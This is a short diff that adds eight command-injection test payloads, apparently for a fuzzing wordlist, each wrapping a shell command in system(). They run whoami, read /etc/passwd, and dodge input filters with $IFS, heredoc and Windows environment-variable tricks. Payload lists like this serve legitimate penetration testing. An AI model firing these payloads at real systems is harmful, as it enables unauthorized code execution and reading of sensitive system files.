@@ -1,0 +1,8 @@
+system('/bin/echo%20\"drake\"')
+system('/bin/cat%20/etc/passwd')
+system('echo%20\"drake\"')
+system('whoami')
+system('IFS=,;`cat<<<uname,-a`')
+system('${@print(md5(RCEVulnerable))}')
+system('cat$IFS/etc/passwd')
+system('ping%CommonProgramFiles:~10,-18%IP')
